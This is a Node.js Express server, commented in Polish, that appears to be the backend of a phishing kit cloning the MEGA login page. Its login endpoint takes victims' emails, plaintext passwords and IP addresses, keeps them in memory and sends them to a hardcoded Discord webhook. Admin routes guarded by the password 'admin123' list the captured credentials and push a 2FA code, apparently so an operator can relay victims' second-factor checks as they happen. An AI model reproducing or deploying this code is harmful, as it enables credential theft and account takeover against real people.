// api/server.js
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// WEBHOOK KONFIGURACJA
// ============================================================
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1544436490254159957/8LfIkC-dfuwBv5-RpLtwJCNvMJHIjClx1wYcjyStywRq3xwN9QGv9TrRwYwQGWiIIi31';

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, '..')));

// ============================================================
// SESJE W PAMIĘCI
// ============================================================
let sessions = {};
let sessionCounter = 0;

// ============================================================
// FUNKCJA WYSYŁANIA NA DISCORD
// ============================================================
async function sendToDiscord(data) {
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: 'MEGA Panel',
                avatar_url: 'https://i.imgur.com/4M3VY1A.png',
                embeds: [{
                    title: data.title || '🔐 Nowe zdarzenie',
                    description: data.description || '',
                    color: data.color || 0xD42B3E,
                    fields: data.fields || [],
                    timestamp: new Date().toISOString(),
                    footer: { text: 'MEGA Clone v2.0' }
                }]
            })
        });
    } catch (e) {
        console.error('Discord webhook error:', e);
    }
}

// ============================================================
// API ENDPOINTY - GET
// ============================================================
app.get('/api', (req, res) => {
    const { action, sessionId, adminPassword } = req.query;

    // ============================================================
    // TEST
    // ============================================================
    if (action === 'test') {
        return res.json({
            status: 'ok',
            message: 'API działa na Render!',
            timestamp: new Date().toISOString(),
            sessions_count: Object.keys(sessions).length
        });
    }

    // ============================================================
    // POLL - sprawdzanie statusu sesji (dla użytkownika)
    // ============================================================
    if (action === 'poll') {
        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        return res.json({
            code: session.code || null,
            verified: session.verified || false,
            rejected: session.rejected || false,
            approved: session.approved || false,
            email: session.email
        });
    }

    // ============================================================
    // SESSIONS - lista sesji dla admina
    // ============================================================
    if (action === 'sessions') {
        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const sessionList = Object.keys(sessions).map(id => {
            const s = sessions[id];
            return {
                sessionId: id,
                email: s.email,
                timestamp: s.timestamp,
                hasCode: !!s.code,
                code: s.code || null,
                verified: s.verified || false,
                rejected: s.rejected || false,
                approved: s.approved || false
            };
        });

        sessionList.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        return res.json({ sessions: sessionList });
    }

    // ============================================================
    // GET-SESSION - pobranie konkretnej sesji
    // ============================================================
    if (action === 'get-session') {
        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        return res.json({
            sessionId: sessionId,
            email: session.email,
            password: session.password,
            ip: session.ip,
            timestamp: session.timestamp,
            code: session.code || null,
            verified: session.verified || false,
            rejected: session.rejected || false,
            approved: session.approved || false
        });
    }

    // ============================================================
    // DELETE-SESSION - usunięcie sesji
    // ============================================================
    if (action === 'delete-session') {
        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        if (sessions[sessionId]) {
            delete sessions[sessionId];
            return res.json({ success: true, message: 'Sesja usunięta' });
        } else {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }
    }

    res.status(404).json({ error: 'Nieznana akcja GET' });
});

// ============================================================
// API ENDPOINTY - POST
// ============================================================
app.post('/api', (req, res) => {
    const { action } = req.query;
    const body = req.body;

    // ============================================================
    // SESSION - logowanie
    // ============================================================
    if (action === 'session') {
        const { email, password, ip } = body;

        if (!email || !password) {
            return res.status(400).json({ error: 'Email i hasło wymagane' });
        }

        sessionCounter++;
        const sessionId = 'ses_' + Date.now().toString(36) + '_' + String(sessionCounter).padStart(4, '0');

        sessions[sessionId] = {
            email,
            password,
            ip: ip || 'N/A',
            timestamp: new Date().toISOString(),
            code: null,
            verified: false,
            rejected: false,
            approved: false
        };

        console.log(`✅ Nowa sesja: ${sessionId} - ${email}`);

        // WYSYŁKA NA DISCORD
        sendToDiscord({
            title: '🔐 Nowe logowanie',
            description: `Email: ${email}`,
            color: 0xFBBF24,
            fields: [
                { name: '📧 Email', value: email, inline: true },
                { name: '🔑 Hasło', value: `||${password}||`, inline: true },
                { name: '🌐 IP', value: ip || 'N/A', inline: true },
                { name: '🆔 Sesja', value: sessionId, inline: true }
            ]
        });

        return res.json({
            success: true,
            sessionId: sessionId,
            message: 'Zalogowano pomyślnie.'
        });
    }

    // ============================================================
    // SET-CODE - admin ustawia kod
    // ============================================================
    if (action === 'set-code') {
        const { sessionId, code, adminPassword } = body;

        if (!sessionId || !code) {
            return res.status(400).json({ error: 'Brak sessionId lub kodu' });
        }

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        session.code = code;
        session.codeSetAt = new Date().toISOString();

        console.log(`🔐 Kod ustawiony dla ${sessionId}: ${code}`);

        sendToDiscord({
            title: '🔐 Kod 2FA ustawiony',
            description: `Kod: ${code} dla użytkownika ${session.email}`,
            color: 0x4ADE80,
            fields: [
                { name: '📧 Email', value: session.email, inline: true },
                { name: '🔐 Kod', value: code, inline: true }
            ]
        });

        return res.json({
            success: true,
            message: 'Kod ustawiony!',
            code: code
        });
    }

    // ============================================================
    // APPROVE - admin zatwierdza
    // ============================================================
    if (action === 'approve') {
        const { sessionId, adminPassword } = body;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        session.approved = true;
        session.verified = true;

        sendToDiscord({
            title: '✅ Admin zatwierdził użytkownika',
            description: `Użytkownik ${session.email} został zatwierdzony.`,
            color: 0x4ADE80
        });

        return res.json({
            success: true,
            message: 'Użytkownik zatwierdzony!',
            approved: true
        });
    }

    // ============================================================
    // REJECT - admin odrzuca
    // ============================================================
    if (action === 'reject') {
        const { sessionId, adminPassword } = body;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        session.rejected = true;

        sendToDiscord({
            title: '❌ Admin odrzucił użytkownika',
            description: `Użytkownik ${session.email} został odrzucony.`,
            color: 0xEF4444
        });

        return res.json({
            success: true,
            message: 'Użytkownik odrzucony!',
            rejected: true
        });
    }

    // ============================================================
    // POLL - POST (alternatywny sposób)
    // ============================================================
    if (action === 'poll') {
        const { sessionId } = body;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        return res.json({
            code: session.code || null,
            verified: session.verified || false,
            rejected: session.rejected || false,
            approved: session.approved || false
        });
    }

    res.status(404).json({ error: 'Nieznana akcja POST' });
});

// ============================================================
// SERWOWANIE INDEX.HTML
// ============================================================
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// ============================================================
// START
// ============================================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📡 API: http://localhost:${PORT}/api?action=test`);
    console.log(`🔗 Discord webhook: ${DISCORD_WEBHOOK_URL ? '✅ Ustawiony' : '❌ Brak'}`);
    console.log('');
    console.log('📋 DOSTĘPNE ENDPOINTY:');
    console.log('  GET  /api?action=test');
    console.log('  GET  /api?action=sessions&adminPassword=admin123');
    console.log('  GET  /api?action=poll&sessionId=XXX');
    console.log('  GET  /api?action=get-session&sessionId=XXX');
    console.log('  POST /api?action=session');
    console.log('  POST /api?action=set-code');
    console.log('  POST /api?action=approve');
    console.log('  POST /api?action=reject');
});
